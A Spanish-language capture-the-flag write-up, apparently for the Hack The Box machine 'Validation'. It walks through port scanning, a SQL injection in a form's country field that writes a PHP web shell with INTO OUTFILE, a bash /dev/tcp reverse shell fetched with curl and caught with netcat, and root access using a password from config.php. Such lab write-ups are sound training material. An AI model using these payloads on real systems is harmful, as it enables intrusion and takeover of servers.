---
title: Validation
published: 2022-07-01
tags: [Markdown, Blogging, Demo]
category: Examples
draft: true
---

## Información Básica

### Técnicas vistas

> SQLI (Error Based)  
> SQLI -> RCE (INTO OUTFILE)  
> Information Leakage

### Preparación

> eJPT  
> eWPT

***

## Reconocimiento

Comenzaremos el reconocimiento de la máquina haciendo un escaneo a los puertos abiertos.

```
nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.10.11.116
```

```
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
80/tcp   open  http       syn-ack ttl 62
4566/tcp open  kwtc       syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63
```

Vemos 4 puertos abiertos, por lo cual haremos un escaneo más profundo sobre ellos.

```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCgSpafkjRVogAlgtxt6cFN7sU4sRTiGYC01QloBpbOwerqFUoYNyhCdNP/9rvdhwFpXomoMhDxioWQZb1RTSbR5aCwkzwDRnLz5PKN/7faaoEVjFM1vSnjGwWxzPZJw4Xy8wEbvMDlNZQbWu44UMWhLH+Vp63egRsut0SkTpUy3Ovp/yb3uAeT/4sUPG+LvDgzXD2QY+O1SV0Y3pE+pRmL3UfRKr2ltMfpcc7y7423+3oRSONHfy1upVUcUZkRIKrl9Qb4CDpxbVi/hYfAFQcOYH+IawAounkeiTMMEtOYbzDysEzVrFcCiGPWOX5+7tu4H7jYnZiel39ka/TFODVA+m2ZJiz2NoKLKTVhouVAGkH7adYtotM62JEtow8MW0HCZ9+cX6ki5cFK9WQhN++KZej2fEZDkxV7913KaIa4HCbiDq1Sfr5j7tFAWnNDo097UHXgN5A0mL1zNqwfTBCHQTEga/ztpDE0pmTKS4rkBne9EDn6GpVhSuabX9S/BLk=
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ9LolyD5tnJ06EqjRR6bFX/7oOoTeFPw2TKsP1KCHJcsPSVfZIafOYEsWkaq67dsCvOdIZ8VQiNAKfnGiaBLOo=
|   256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJOP8cvEQVqCwuWYT06t/DEGxy6sNajp7CzuvfJzrCRZ
80/tcp   open  http    syn-ack ttl 62 Apache httpd 2.4.48 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.48 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
4566/tcp open  http    syn-ack ttl 63 nginx
|_http-title: 403 Forbidden
8080/tcp open  http    syn-ack ttl 63 nginx
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Al ver que tenemos un puerto **http** abierto vamos a hacer un reconocimiento de las tecnologías web que usa con **whatweb**.

```
http://10.10.11.116 [200 OK] Apache[2.4.48], Bootstrap, Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.48 (Debian)], IP[10.10.11.116], JQuery, PHP[7.4.23], Script, X-Powered-By[PHP/7.4.23]
```

Vemos que usa **PHP** principalmente junto con **Apache**. Nada más entrar a la web podemos ver un pequeño formulario de registro con 2 campos.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Fo45BmozdNyqQ3ACBTkan%2Fimg1.png?alt=media&#x26;token=8eecd3a9-b48e-408b-ad39-5e0ce5f410e5" alt=""><figcaption></figcaption></figure>

## Explotación

El campo del **usuario** no es vulnerable a <mark style="color:red;">**SQL Injection**</mark>, pero podemos interceptar la petición con <mark style="color:orange;">**Burpsuite**</mark> y ver si el campo del "_País_" es vulnerable.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FtHsuOLd7WyXTdkpdgGIG%2Fimg2.png?alt=media&#x26;token=b13b50fe-537b-4618-8a53-281456816a3e" alt=""><figcaption></figcaption></figure>

Bingo! Como podemos ver con una sola **'**, vemos que da un error, por lo cual es vulnerable. Vamos a intentar subir una <mark style="color:purple;">**web shell**</mark> básica para <mark style="color:purple;">**PHP**</mark>**.**

```
<?php system($_GET['cmd']); ?>
```

Así quedaría la inyección en la solicitud.

{% code overflow="wrap" %}
```
username=sqli&country=Brazil' union all select "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/wshell.php" -- -
```
{% endcode %}

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Fs6SGza91kAoGh1Chv4vx%2Fimg3.png?alt=media&#x26;token=987816c5-f651-4f8b-a126-134b93936404" alt=""><figcaption></figcaption></figure>

Perfecto, hemos conseguido la web shell funcional, por lo que vamos a intentar obtener una persistencia. Usaremos esta <mark style="color:green;">**Bash TCP reverse shell**</mark>.

```
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

Y luego la pasaremos al servidor mediante un servidor local con <mark style="color:yellow;">**python**</mark>.

```
python -m http.server 80
```

Después en la **URL** pondremos lo siguiente para obtener la **shell**.

```
<URL>?cmd=curl+<IP>:80/revshell.sh > revshell.sh
```

Una vez subido, para comprobar que todo ha ido bien, si ejecutamos un **ls** deberíamos poder ver la **revshell.sh.**&#x20;

Para ejecutarla nos pondremos en escucha primero por el puerto que hayamos escogido con <mark style="color:orange;">**netcat**</mark>.

```
nc -lvnp <PORT>
```

Simplemente la ejecutamos en el servidor.

```
bash revshell.sh
```

Si todo ha ido bien, deberíamos tener la reverse shell.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FnH4zJYwUZl0xrB3SuA4y%2Fimg4.png?alt=media&#x26;token=154a99a6-f6bc-467f-b2b5-d34255a5a633" alt=""><figcaption></figcaption></figure>

Estando dentro podemos ver que hay un archivo **config.php**, así que veremos su contenido, puede ser importante.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Ff7MLemV1MzAPAgxrlbty%2Fimg5.png?alt=media&#x26;token=a1d4e20a-dc7a-45ca-afe5-adb983798f70" alt=""><figcaption></figcaption></figure>

Gracias al comando:

```
cat /etc/passwd | grep "bash"
```

Podemos ver que solo existe el usuario **root**, que si probamos con la contraseña del **config.php** parecerá que se queda estancado, pero realmente ya hemos accedido al usuario y tenemos root. Ya solo queda obtener ambas flags del directorio <mark style="color:purple;">/home/\<usuario>/user.txt</mark> y <mark style="color:purple;">/root/root.txt</mark>.

{% embed url="https://www.hackthebox.com/achievement/machine/1992274/401" %}



---
